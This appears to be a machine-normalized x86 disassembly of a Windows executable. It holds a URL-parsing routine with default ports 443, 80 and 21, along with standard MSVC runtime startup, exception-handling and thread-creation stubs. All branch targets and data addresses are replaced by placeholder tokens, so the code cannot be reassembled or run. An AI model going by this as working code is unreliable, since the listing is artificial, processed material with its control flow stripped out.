mov [ ebp - 0x838 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x834 ]
mov al [ eax ]
mov [ ebp - 0x839 ] al
inc [ ebp - 0x834 ]
cmp [ ebp - 0x839 ] 0x0
jne r-xdata
mov eax [ ebp - 0x834 ]
sub eax [ ebp - 0x838 ]
mov [ ebp - 0x840 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x840 ]
jae r-xdata
and [ ebp - 0x41c ] 0x0
and [ ebp - 0x8 ] 0x0
movzx eax [ ebp - 0x415 ]
test eax eax
je r-xdata
push 0x4
push r--data
push [ ebp + 0xc ]
call strncpy
add esp 0xc
mov eax [ ebp + 0xc ]
mov [ eax + 0x5 ] 0x0
mov [ ebp - 0x415 ] 0x1
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call strncpy
add esp 0xc
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x4 ]
mov [ eax ] 0x0
push 0x1
push r--data
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x41c ] eax
mov eax [ ebp - 0x41c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x3
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x41c ] eax
mov eax [ ebp - 0x41c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x844 ]
mov al [ eax ]
mov [ ebp - 0x849 ] al
inc [ ebp - 0x844 ]
cmp [ ebp - 0x849 ] 0x0
jne r-xdata
mov eax [ ebp - 0x844 ]
sub eax [ ebp - 0x848 ]
mov [ ebp - 0x850 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x844 ] eax
mov eax [ ebp - 0x844 ]
inc eax
mov [ ebp - 0x848 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x824 ] eax
mov eax [ ebp - 0x824 ]
inc eax
mov [ ebp - 0x828 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x864 ] eax
mov eax [ ebp - 0x864 ]
inc eax
mov [ ebp - 0x868 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x854 ] eax
mov eax [ ebp - 0x854 ]
inc eax
mov [ ebp - 0x858 ] eax
mov eax [ ebp - 0x864 ]
mov al [ eax ]
mov [ ebp - 0x869 ] al
inc [ ebp - 0x864 ]
cmp [ ebp - 0x869 ] 0x0
jne r-xdata
mov eax [ ebp - 0x864 ]
sub eax [ ebp - 0x868 ]
mov [ ebp - 0x870 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x870 ]
jae r-xdata
mov eax [ ebp - 0x854 ]
mov al [ eax ]
mov [ ebp - 0x859 ] al
inc [ ebp - 0x854 ]
cmp [ ebp - 0x859 ] 0x0
jne r-xdata
mov eax [ ebp - 0x854 ]
sub eax [ ebp - 0x858 ]
mov [ ebp - 0x860 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x860 ]
jae r-xdata
mov [ ebp - 0x415 ] 0x0
mov eax [ ebp - 0x41c ]
mov [ ebp - 0x420 ] eax
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x894 ]
mov al [ eax ]
mov [ ebp - 0x899 ] al
inc [ ebp - 0x894 ]
cmp [ ebp - 0x899 ] 0x0
jne r-xdata
mov eax [ ebp - 0x894 ]
sub eax [ ebp - 0x898 ]
mov [ ebp - 0x8a0 ] eax
je r-xdata
mov eax [ ebp - 0x874 ]
mov al [ eax ]
mov [ ebp - 0x879 ] al
inc [ ebp - 0x874 ]
cmp [ ebp - 0x879 ] 0x0
jne r-xdata
mov eax [ ebp - 0x874 ]
sub eax [ ebp - 0x878 ]
mov [ ebp - 0x880 ] eax
je r-xdata
mov eax [ ebp - 0x41c ]
mov [ ebp - 0x414 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8a4 ] eax
mov eax [ ebp - 0x8a4 ]
inc eax
mov [ ebp - 0x8a8 ] eax
mov eax [ ebp - 0x420 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x884 ] eax
mov eax [ ebp - 0x884 ]
inc eax
mov [ ebp - 0x888 ] eax
mov eax [ ebp - 0x414 ]
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax [ ebp - 0x8a4 ]
mov al [ eax ]
mov [ ebp - 0x8a9 ] al
inc [ ebp - 0x8a4 ]
cmp [ ebp - 0x8a9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8a4 ]
sub eax [ ebp - 0x8a8 ]
mov [ ebp - 0x8b0 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8b0 ]
jae r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x41c ] eax
mov eax [ ebp - 0x420 ]
sub eax [ ebp - 0x41c ]
push eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x41c ]
push eax
push [ ebp + 0x10 ]
call strncpy
add esp 0xc
mov eax [ ebp - 0x420 ]
sub eax [ ebp - 0x41c ]
mov ecx [ ebp + 0x10 ]
mov [ ecx + eax + 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x420 ]
dec eax
push eax
mov eax [ ebp - 0x420 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x1 ]
push eax
push [ ebp + 0x14 ]
call strncpy
add esp 0xc
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x420 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx + eax ] 0x0
mov eax [ ebp - 0x884 ]
mov al [ eax ]
mov [ ebp - 0x889 ] al
inc [ ebp - 0x884 ]
cmp [ ebp - 0x889 ] 0x0
jne r-xdata
mov eax [ ebp - 0x884 ]
sub eax [ ebp - 0x888 ]
mov [ ebp - 0x890 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x890 ]
jae r-xdata
movzx eax [ ebp - 0x415 ]
test eax eax
je r-xdata
push 0x1
push r--data
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x414 ]
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push r--data
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
push 0x1
push r--data
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x420 ]
push eax
call strncmp
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x8b4 ] r--data
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8b8 ] eax
mov ax [ r--data ]
mov [ ebp - 0x820 ] ax
push 0x3fe
push 0x0
lea eax [ ebp - 0x81e ]
push eax
call memset
add esp 0xc
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x414 ]
push eax
mov eax [ ebp - 0x414 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax + 0x1 ]
push eax
lea eax [ ebp - 0x820 ]
push eax
call strncpy
add esp 0xc
lea eax [ ebp - 0x820 ]
push eax
call atol
pop ecx
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
mov eax [ ebp - 0x414 ]
sub eax [ ebp - 0x41c ]
push eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x41c ]
push eax
push [ ebp + 0x18 ]
call strncpy
add esp 0xc
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x415 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x420 ]
inc eax
mov [ ebp - 0x420 ] eax
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x8c0 ] eax
cmp [ ebp - 0x8b9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8dc ] eax
mov eax [ ebp - 0x8dc ]
inc eax
mov [ ebp - 0x8e0 ] eax
mov eax [ ebp - 0x414 ]
inc eax
mov [ ebp - 0x414 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x894 ] eax
mov eax [ ebp - 0x894 ]
inc eax
mov [ ebp - 0x898 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x874 ] eax
mov eax [ ebp - 0x874 ]
inc eax
mov [ ebp - 0x878 ] eax
mov [ ebp - 0x8c8 ] r--data
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8cc ] eax
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x1bb
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x41c ]
push eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x41c ]
push eax
push [ ebp + 0x18 ]
call strncpy
add esp 0xc
jmp r-xdata
and [ ebp - 0x8c0 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8b8 ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x8ba ] al
mov ecx [ ebp - 0x8b4 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
mov eax [ ebp - 0x8dc ]
mov al [ eax ]
mov [ ebp - 0x8e1 ] al
inc [ ebp - 0x8dc ]
cmp [ ebp - 0x8e1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8dc ]
sub eax [ ebp - 0x8e0 ]
mov [ ebp - 0x8e8 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8e8 ]
jae r-xdata
sbb eax eax
sbb eax 0xffffffff
mov [ ebp - 0x8d4 ] eax
cmp [ ebp - 0x8cd ] 0x0
je r-xdata
mov eax [ ebp - 0x8c0 ]
mov [ ebp - 0x8c4 ] eax
cmp [ ebp - 0x8c4 ] 0x0
jne r-xdata
add [ ebp - 0x8b8 ] 0x2
add [ ebp - 0x8b4 ] 0x2
cmp [ ebp - 0x8ba ] 0x0
jne r-xdata
mov eax [ ebp + 0x20 ]
mov [ eax ] 0x2f
mov eax [ ebp + 0x20 ]
mov [ eax + 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8ec ] eax
mov eax [ ebp - 0x8ec ]
inc eax
mov [ ebp - 0x8f0 ] eax
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x50
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x41c ]
push eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x41c ]
push eax
push [ ebp + 0x18 ]
call strncpy
add esp 0xc
mov eax [ ebp + 0x1c ]
mov [ eax ] 0x15
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x41c ]
push eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x41c ]
push eax
push [ ebp + 0x18 ]
call strncpy
add esp 0xc
jmp r-xdata
and [ ebp - 0x8d4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8cc ]
mov al [ eax + 0x1 ]
mov [ ebp - 0x8ce ] al
mov ecx [ ebp - 0x8c8 ]
cmp al [ ecx + 0x1 ]
jne r-xdata
mov eax [ ebp - 0x8b8 ]
mov al [ eax ]
mov [ ebp - 0x8b9 ] al
mov ecx [ ebp - 0x8b4 ]
cmp al [ ecx ]
jne r-xdata
mov eax [ ebp - 0x8ec ]
mov al [ eax ]
mov [ ebp - 0x8f1 ] al
inc [ ebp - 0x8ec ]
cmp [ ebp - 0x8f1 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8ec ]
sub eax [ ebp - 0x8f0 ]
mov [ ebp - 0x8f8 ] eax
mov eax [ ebp - 0x8f8 ]
sub eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x20 ]
call strncpy
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8d4 ]
mov [ ebp - 0x8d8 ] eax
cmp [ ebp - 0x8d8 ] 0x0
jne r-xdata
add [ ebp - 0x8cc ] 0x2
add [ ebp - 0x8c8 ] 0x2
cmp [ ebp - 0x8ce ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
xor ecx ebp
call sub_4097f0
leave
retn
mov eax [ ebp - 0x8cc ]
mov al [ eax ]
mov [ ebp - 0x8cd ] al
mov ecx [ ebp - 0x8c8 ]
cmp al [ ecx ]
jne r-xdata
sub_409800
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40984c
cmp [ rw-data ] 0x0
je sub_409866
sub esp 0x4
fnstcw [ esp ]
pop eax
and ax 0x7f
cmp ax 0x7f
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_409866
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_4098db
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x2
push edi
mov edi ecx
je r-xdata
call ?_type_info_dtor_internal_method@type_info@@QAEXXZ
test [ ebp + 0x8 ] 0x1
je r-xdata
push esi
push ?_type_info_dtor_internal_method@type_info@@QAEXXZ
lea esi [ edi - 0x4 ]
push [ esi ]
push 0xc
push edi
call sub_409ece
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
push edi
call ??3@YAXPAX@Z
pop ecx
mov eax esi
pop esi
jmp r-xdata
push esi
call operator delete
pop ecx
pop edi
pop ebp
retn 0x4
sub_409952
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_4097f0
push rw-data
call _except_handler4_common
add esp 0x18
pop ebp
retn
sub_409996
push sub_40a070
call sub_40a033
mov eax [ rw-data ]
mov [ esp ] rw-data
push [ rw-data ]
mov [ rw-data ] eax
push rw-data
push rw-data
push rw-data
call [ __getmainargs@IAT ]
add esp 0x14
mov [ rw-data ] eax
test eax eax
jge r-xdata
retn
push 0x8
call _amsg_exit
pop ecx
sub_4099e1
push 0x58
push r--data
call sub_40a1fc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x4 ] 0x1
mov eax [ fs : 0x18 ]
mov esi [ eax + 0x4 ]
mov edi rw-data
xor esi esi
inc esi
cmp eax esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x1f
call _amsg_exit
pop ecx
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
xor esi esi
inc esi
mov ebx esi
jmp r-xdata
mov [ rw-data ] esi
mov [ rw-data ] esi
push r--data
push r--data
call _initterm_e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
push 0x0
push esi
push edi
call [ InterlockedCompareExchange@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
test ebx ebx
jne r-xdata
push r--data
push r--data
call _initterm
pop ecx
pop ecx
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push ebx
push edi
call [ InterlockedExchange@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
push rw-data
call sub_40a130
pop ecx
test eax eax
je r-xdata
cmp al 0x22
jne r-xdata
test al al
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
movzx eax al
push eax
call [ _ismbblead@IAT ]
pop ecx
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x1c ] ecx
sete cl
mov [ ebp - 0x1c ] ecx
mov al [ esi ]
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
inc esi
jmp r-xdata
inc esi
mov [ ebp - 0x20 ] esi
test [ ebp - 0x3c ] 0x1
je r-xdata
cmp al 0x20
ja r-xdata
mov [ ebp - 0x20 ] esi
mov al [ esi ]
cmp al 0x20
ja r-xdata
push 0xa
pop eax
movzx eax [ ebp - 0x38 ]
jmp r-xdata
inc esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push eax
call [ exit@IAT ]
push eax
push esi
push 0x0
push __dos_header
call sub_4063af
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ rw-data ]
jmp r-xdata
call [ _cexit@IAT ]
call sub_40a241
retn
sub_409bc0
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
lea eax [ eax + __dos_header ]
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
jmp r-xdata
movzx ecx [ eax + 0x18 ]
cmp ecx 0x10b
je r-xdata
push 0x2
mov [ rw-data ] eax
call [ __set_app_type@IAT ]
push 0xffffffff
call [ _encode_pointer@IAT ]
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40a04a
call sub_40a280
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp ecx 0x20b
jne r-xdata
call sub_40a255
cmp [ rw-data ] 0xffffffff
jne r-xdata
push sub_40a280
call [ __setusermatherr@IAT ]
pop ecx
xor ecx ecx
cmp [ eax + 0xe8 ] ecx
cmp [ eax + 0x84 ] 0xe
jbe r-xdata
xor eax eax
retn
push 0xffffffff
call [ _configthreadlocale@IAT ]
pop ecx
xor ecx ecx
cmp [ eax + 0xf8 ] ecx
jmp r-xdata
setne cl
mov eax ecx
sub_409cab
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
sub_409e01
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_409db1
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_409e70
push 0x14
push r--data
call sub_40a1fc
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a241
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_409e93
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a241
retn 0x10
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_409ece
push 0xc
push r--data
call sub_40a1fc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409f19
call sub_40a241
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_409f38
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call ?terminate@@YAXXZ
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_409f8e
push 0x14
push r--data
call sub_40a1fc
push [ rw-data ]
mov esi [ _decode_pointer@IAT ]
call esi
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x8
call _lock
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
call esi
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call esi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
mov esi [ _encode_pointer@IAT ]
call esi
pop ecx
push eax
call __dllonexit
mov [ ebp - 0x24 ] eax
push [ ebp - 0x1c ]
call esi
mov [ rw-data ] eax
push [ ebp - 0x20 ]
call esi
add esp 0x14
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a02a
mov eax [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ _onexit@IAT ]
pop ecx
jmp r-xdata
call sub_40a241
retn
sub_40a04a
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40a070
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40a0a0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40a0e0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a130
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_409952
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40a0a0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40a0e0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a1fc
push sub_409952
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_40a255
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call _controlfp_s
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call _invoke_watson
add esp 0x14
sub_40a283
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_401eff
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call _time64
pop ecx
pop ebp
retn
sub_401f0d
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push [ ebp - 0x4 ]
push 0x0
push sub_401f28
call _beginthread
add esp 0xc
leave
retn
sub_401f28
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
call sub_401754
leave
retn
sub_402140
jmp r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_4022db
jmp r-xdata
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_40323a
jmp r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x1c ]
